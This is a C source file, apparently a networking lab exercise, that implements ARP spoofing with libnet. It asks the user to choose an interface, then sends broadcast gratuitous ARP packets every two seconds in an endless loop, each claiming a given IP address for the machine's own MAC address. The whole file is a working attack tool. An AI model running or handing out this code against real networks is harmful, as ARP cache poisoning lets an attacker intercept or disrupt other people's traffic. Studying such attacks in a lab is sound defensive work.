/*********************************************************
 * 
 * ARPspoofing.c 
 *
 * Inspired on macflooder.c
 * Some code by Jiazi Yi
*********************************************************/


#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h>

#define ERRBUF_SIZE 500
#define IP_MAX_SIZE 16


void usage(){
  printf("./ARPspoofing <IP addr>\n");
  printf("The ARP messages will be sent as gratuitous ARP on broadcast\n");
}

int main(int argc, char **argv){

	if (argc < 2){
    usage();
		exit(1);
	}
	int i=1;

	/******** Choosing the device : code by Jiazi Yi ***********/
	pcap_if_t *all_dev, *dev;
	char *dev_name;
	char err_buf[ERRBUF_SIZE], dev_list[30][2];
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}
	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}
	printf("Available devices list: \n");
	int c = 1;
	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}
	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //Deleting final '\n'
  /********** End of device choice *****************************/

	/******** Setting up libnet & hardware addresses ***************/
  // Initialization of libnet context   
	libnet_t *context;
	if ((context = libnet_init(LIBNET_LINK, dev_name, err_buf)) == NULL){
    	errx(1, "%s", err_buf);
  	}

    //The source IP (ie. the one we want to spoof) is specified by the user
    //Since we send a gratuitous ARP message, the destination IP address is set as equal to the source IP
  	char srcipstring[IP_MAX_SIZE];
  	strncpy(srcipstring,argv[1],IP_MAX_SIZE);
  	uint32_t srcipaddr;
  	inet_pton(AF_INET,srcipstring,&srcipaddr);

    //The source hardware address is our own interface's address
  	uint8_t *srchdaddr = (uint8_t*) libnet_get_hwaddr(context);  
  	uint8_t desthdaddr[6];
  	memset(desthdaddr,255,6);  //The destination IP adress is ff:ff:ff:ff:ff:ff


  	while (1){
  		libnet_build_arp(ARPHRD_ETHER,           //hardware addr type
                      ETHERTYPE_IP,            //protocol addr type
                      6,                       //hardware addr size
                      4,                       //protocol addr size
                      1,                       //operation type (example : 2 for Gratuitous ARP)
                      srchdaddr,               //sender hardware addr
                      (uint8_t*)&srcipaddr,    //sender protocol addr
                      desthdaddr,              //target hardware addr
                      (uint8_t*)&srcipaddr,    //target protocol addr
                      NULL,                    //payload
                      0,                       //payload length
                      context,                 //pointer to libnet context
                      0);                      //header protocol tag (0 to build a new one)

  		libnet_build_ethernet(desthdaddr,     //destination ethernet address
                          srchdaddr,        //source ethernet address
                          ETHERTYPE_ARP,    //upper layer protocol type
                          NULL,             //payload
                          0,                //payload length
                          context,          //pointer to libnet context
                          0); 			        //header protocol tag (0 to build a new one)
  		//packet injection
    	if (libnet_write(context) < 0)
      	errx(1, "Error during packet injection");

    	//clear the context in order for another injection
    	libnet_clear_packet(context);

    	sleep(2); //No need to be super fast, gratuitous ARP can be sent every 2 seconds.
  	  printf(" Number of injections: %d\r",i++);
      fflush(stdout);
    }	
 	printf(" Number of injections: %d\n", i);
  
  	return 1;
}